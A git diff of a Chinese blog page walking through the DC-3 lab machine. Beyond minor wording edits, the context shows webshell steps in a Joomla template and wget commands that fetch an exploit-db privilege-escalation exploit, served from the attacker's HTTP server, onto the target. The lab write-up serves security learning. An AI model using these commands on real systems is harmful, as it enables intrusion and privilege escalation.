@@ -67,7 +67,7 @@
 <meta property="og:image" content="http://zh1yu.xyz/2025/06/17/DC-3-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/39.png">
 <meta property="og:image" content="http://zh1yu.xyz/2025/06/17/DC-3-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/40.png">
 <meta property="article:published_time" content="2025-06-17T11:12:01.000Z">
-<meta property="article:modified_time" content="2025-06-18T09:23:53.080Z">
+<meta property="article:modified_time" content="2025-06-18T09:28:50.770Z">
 <meta property="article:author" content="zh1yu">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
@@ -231,7 +231,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-18 17:23:53" itemprop="dateModified" datetime="2025-06-18T17:23:53+08:00">2025-06-18</time>
+                <time title="修改时间：2025-06-18 17:28:50" itemprop="dateModified" datetime="2025-06-18T17:28:50+08:00">2025-06-18</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -315,7 +315,7 @@
 <p><img src="23.png" alt="图片"></p>
 <p>我们往里面写入phpinfo看是否有效：</p>
 <p><img src="24.png" alt="图片"></p>
-<p>这里如何确定该文件的目录结构呢？要么去网上找该cms的框架结构，或者一点点尝试：先试试<strong>/administrator/templates/</strong>，虽然有内容，但这些页面跟我们要找的不一致，那就把administrator去掉<strong>/templates/beez3/</strong>，虽然是空白页面，但并没有报错，说明该目录下存在文件：</p>
+<p>这里如何确定该文件的目录结构呢？要么去网上找该cms的框架结构，或者一点点尝试：先试试<strong>/administrator/templates/</strong>，虽然有内容，但这些页面跟我们要找的不一致，那就把administrator去掉，尝试<strong>/templates/beez3/</strong>，虽然是空白页面，但并没有报错，说明该目录下存在文件：</p>
 <p><img src="25_1.png" alt="图片"></p>
 <p><img src="25_2.png" alt="图片"></p>
 <p>尝试jsstrings.php写入的phpinfo是否有效：</p>
@@ -343,13 +343,13 @@
 <p>找到脚本的下载地址：<a target="_blank" rel="noopener" href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a>，我们需要把该脚本放到webshell中执行就能提权</p>
 <p>以为随便一个目录就可以呢，结果是必须在<code>/var/www/html/templates/beez3</code>目录下</p>
 <p>有两种方式把该脚本上传到靶机上</p>
-<p><strong>一</strong>.kali主机上wget下载到选定的目录：</p>
+<p><strong>一</strong>.kali主机上wget下载到指定的目录：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip -O <span class="string">&quot;/home/zh1yu/39772.zip&quot;</span></span><br></pre></td></tr></table></figure>
 <p><img src="32.png" alt="图片"></p>
-<p>然后在该目录下启动简易 HTTP 服务器的Python 2 命令，主要用于本地开发或文件共享</p>
+<p>然后在<strong>该目录下</strong>启动简易 HTTP 服务器的Python 2 命令，主要用于本地开发或文件共享</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 9999</span><br></pre></td></tr></table></figure>
 <p><img src="33.png" alt="图片"></p>
-<p>然后在webshell中下载（这里下载的根目录是http服务开启的目录：<code>/home/zh1yu/</code>）：</p>
+<p>然后在webshell中下载（<strong>这里下载的根目录是http服务开启的目录</strong>：<code>/home/zh1yu/</code>）：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.130.128:9999/dc8.sh -O /tmp/39772.zip</span><br></pre></td></tr></table></figure>
 <p><img src="34.png" alt="图片"></p>
 <p>当然上面那种做法比较麻烦，完全可以在webshell中下载脚本，在wget能使用的前提下：</p>
